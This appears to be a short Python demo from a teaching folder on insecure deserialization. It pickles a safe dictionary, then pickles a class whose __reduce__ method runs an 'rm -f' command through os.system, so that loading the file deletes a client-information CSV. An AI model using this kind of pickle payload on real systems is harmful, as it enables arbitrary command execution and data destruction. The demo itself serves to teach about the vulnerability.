import os
import pickle


def serialize_exploit(user_input):
    f = open("examples/insecure_deserialization/pickle_example/demo.pickle", "wb")
    pickle.dump(user_input, f)


# Safe input
user_input = {"test": "some safe input"}
serialize_exploit(user_input)


# Not-safe input
class DeleteClientInfo():
    def __reduce__(self):
        command = "rm -f examples/insecure_deserialization/pickle_example/important_client_information.csv"
        return(os.system, (command,))

serialize_exploit(DeleteClientInfo())
